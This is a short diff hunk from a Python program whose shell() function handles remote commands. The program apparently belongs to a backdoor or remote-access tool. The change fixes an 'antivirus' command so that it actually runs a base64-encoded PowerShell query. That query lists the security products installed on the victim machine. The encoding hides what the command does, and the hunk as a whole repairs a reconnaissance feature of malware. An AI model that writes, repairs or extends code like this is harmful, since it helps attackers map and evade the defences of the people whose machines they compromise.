@@ -361,7 +361,7 @@ def shell():
 
         elif command == 'antivirus':
             try:
-                execute = subprocess.run(['powershell', 'E', 'RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIAAiAHIAbwBvAHQAXABTAGUAYwB1AHIAaQB0AHkAQwBlAG4AdABlAHIAMgAiACAALQBDAGwAYQBzAHMAIABBAG4AdABpAFYAaQByAHUAcwBQAHIAbwBkAHUAYwB0AA=='], shell=True, stdout=subprocess.PIPE, 
+                execute = subprocess.run(['powershell', '-E', 'RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0ATgBhAG0AZQBzAHAAYQBjAGUAIAAiAHIAbwBvAHQAXABTAGUAYwB1AHIAaQB0AHkAQwBlAG4AdABlAHIAMgAiACAALQBDAGwAYQBzAHMAIABBAG4AdABpAFYAaQByAHUAcwBQAHIAbwBkAHUAYwB0AA=='], shell=True, stdout=subprocess.PIPE, 
                                          stderr=subprocess.PIPE,
                                    stdin=subprocess.PIPE)
                 result = execute.stdout + execute.stderr
